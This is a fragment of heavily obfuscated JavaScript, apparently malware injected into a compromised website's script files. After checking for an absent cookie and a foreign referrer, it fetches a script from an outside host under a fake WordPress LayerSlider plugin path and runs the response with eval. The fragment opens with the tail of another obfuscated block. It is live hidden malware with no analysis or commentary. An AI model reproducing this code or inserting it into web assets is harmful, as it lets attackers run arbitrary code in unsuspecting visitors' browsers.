i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};